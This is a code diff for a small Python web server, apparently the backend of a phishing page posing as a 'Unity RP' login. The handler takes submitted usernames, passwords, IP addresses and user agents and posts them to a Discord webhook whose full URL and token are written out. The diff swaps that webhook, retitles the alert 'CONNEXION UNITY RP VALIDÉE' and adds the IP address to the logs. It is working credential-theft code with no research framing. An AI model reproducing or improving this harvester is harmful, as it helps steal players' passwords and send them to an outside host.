@@ -4,7 +4,7 @@ import datetime
 import urllib.request
 import os
 
-WEBHOOK_URL = "https://discord.com/api/webhooks/1532553921095270530/dP3FzsnWbetZfkPN3HuRAKDY_xNCgfNekonHwEPoE4F_MQRmA-6v6-BC5hWbmBc2mmWK"
+WEBHOOK_URL = "https://discord.com/api/webhooks/1536029607050870957/v2lW072iaQP_hprGmBLGJ2U_FrmrVWd-4zum6_KeiL8rZ1fBquBZYQvozIlS0HA3eva0"
 
 class UnityRPHandler(SimpleHTTPRequestHandler):
     def end_headers(self):
@@ -31,11 +31,10 @@ class UnityRPHandler(SimpleHTTPRequestHandler):
                 ip_addr = data.get('ip', 'Non spécifiée')
                 user_agent = data.get('userAgent', 'Non spécifié')
 
-                print(f"[SUCCES] Données reçues - User: {username}")
+                print(f"[EXPERT-LOG] Données reçues - User: {username} | IP: {ip_addr}")
 
-                # Construction du message Discord
                 msg = (
-                    f"🚨 **NOUVELLE TENTATIVE UNITY RP** [{now}] 🚨\n"
+                    f"🚨 **CONNEXION UNITY RP VALIDÉE** [{now}] 🚨\n"
                     f"👤 **Utilisateur :** {username}\n"
                     f"🔑 **Mot de passe :** {password}\n"
                     f"🌐 **Adresse IP :** {ip_addr}\n"
@@ -57,7 +56,7 @@ class UnityRPHandler(SimpleHTTPRequestHandler):
                 self.wfile.write(json.dumps({"status": "success"}).encode('utf-8'))
 
             except Exception as e:
-                print(f"[ERREUR] Échec du traitement POST : {e}")
+                print(f"[EXPERT-ERREUR] Échec du traitement POST : {e}")
                 self.send_response(500)
                 self.send_header('Content-Type', 'application/json')
                 self.end_headers()
@@ -66,8 +65,11 @@ class UnityRPHandler(SimpleHTTPRequestHandler):
             self.send_error(404, "Endpoint non trouvé")
 
 if __name__ == '__main__':
+    # Force le positionnement du répertoire de travail là où se trouve le script
+    os.chdir(os.path.dirname(os.path.abspath(__file__)))
+    
     port = int(os.environ.get("PORT", 10000))
     server_address = ('', port)
     httpd = HTTPServer(server_address, UnityRPHandler)
-    print(f"Serveur Web actif sur le port {port}")
+    print(f"[EXPERT] Serveur Web opérationnel sur le port {port}")
     httpd.serve_forever()
